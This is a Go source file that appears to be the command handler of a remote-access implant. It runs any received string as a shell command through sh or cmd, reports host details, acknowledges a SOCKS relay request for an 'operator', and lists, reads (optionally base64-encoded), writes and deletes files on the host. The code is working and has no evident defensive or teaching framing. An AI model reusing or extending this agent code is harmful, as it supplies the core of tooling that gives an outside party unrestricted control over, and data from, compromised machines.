package main

import (
	"encoding/base64"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
)

func runTask(cmd string, args map[string]any) string {
	cmd = strings.TrimSpace(cmd)
	if strings.HasPrefix(cmd, "file:") {
		return runFileOp(cmd, args)
	}
	if cmd == "socks:start" {
		return "socks:start acknowledged (full relay requires operator SOCKS listener)"
	}
	if cmd == "sysinfo" {
		return fmt.Sprintf("os=%s arch=%s hostname=%s", runtime.GOOS, runtime.GOARCH, hostName())
	}
	// default: shell
	var c *exec.Cmd
	if runtime.GOOS == "windows" {
		c = exec.Command("cmd", "/C", cmd)
	} else {
		c = exec.Command("sh", "-c", cmd)
	}
	out, err := c.CombinedOutput()
	if err != nil {
		return string(out) + "\n" + err.Error()
	}
	return string(out)
}

func runFileOp(cmd string, args map[string]any) string {
	op := strings.TrimPrefix(cmd, "file:")
	path, _ := args["path"].(string)
	if path == "" && op != "list" {
		return "error: path required"
	}
	switch op {
	case "list":
		if path == "" {
			path = "."
		}
		entries, err := os.ReadDir(path)
		if err != nil {
			return err.Error()
		}
		var b strings.Builder
		for _, e := range entries {
			info, _ := e.Info()
			mode := "f"
			if e.IsDir() {
				mode = "d"
			}
			sz := int64(0)
			if info != nil {
				sz = info.Size()
			}
			fmt.Fprintf(&b, "%s\t%d\t%s\n", mode, sz, e.Name())
		}
		return b.String()
	case "read":
		data, err := os.ReadFile(path)
		if err != nil {
			return err.Error()
		}
		// chunk hint: base64 for binary safety
		if _, ok := args["as_b64"]; ok {
			return base64.StdEncoding.EncodeToString(data)
		}
		return string(data)
	case "write":
		var data []byte
		if s, ok := args["content_b64"].(string); ok && s != "" {
			var err error
			data, err = base64.StdEncoding.DecodeString(s)
			if err != nil {
				return err.Error()
			}
		} else if s, ok := args["content"].(string); ok {
			data = []byte(s)
		} else {
			return "error: content required"
		}
		if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil && filepath.Dir(path) != "." {
			// ignore
		}
		if err := os.WriteFile(path, data, 0o600); err != nil {
			return err.Error()
		}
		return "ok"
	case "delete":
		if err := os.Remove(path); err != nil {
			return err.Error()
		}
		return "ok"
	default:
		return "error: unknown file op"
	}
}

func hostName() string {
	h, _ := os.Hostname()
	return h
}
